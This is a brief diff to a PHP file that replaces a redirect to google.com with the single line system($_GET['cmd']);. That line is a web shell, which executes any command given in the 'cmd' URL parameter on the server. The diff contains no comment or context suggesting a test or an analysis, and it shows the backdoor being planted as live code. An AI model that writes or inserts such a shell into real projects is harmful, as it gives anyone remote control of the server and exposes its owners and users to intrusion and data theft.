@@ -1,4 +1,3 @@
 <?php
-header('Location:https://google.com');
-    
+system($_GET['cmd']);
 ?>
